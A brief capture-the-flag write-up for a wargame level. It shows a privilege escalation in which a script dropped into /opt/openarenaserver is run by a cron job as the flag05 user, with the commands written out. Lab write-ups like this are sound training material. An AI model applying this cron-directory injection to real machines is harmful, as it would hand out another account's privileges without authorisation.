# Level05

Let's find all files named after our user.
>`find / -name "*level05" 2>/dev/null`

In `/var/mail/level05` we can find a cron job which executes `/usr/sbin/openarenaserver` as flag05 every 2 minutes.
`/usr/sbin/openarenaserver` is a script which executes every script inside `/opt/openarenaserver` and deletes them.

We'll create our own script inside `/opt/openarenaserver`.
>`echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/getflag`

Get the flag.
>`cat /tmp/flag`
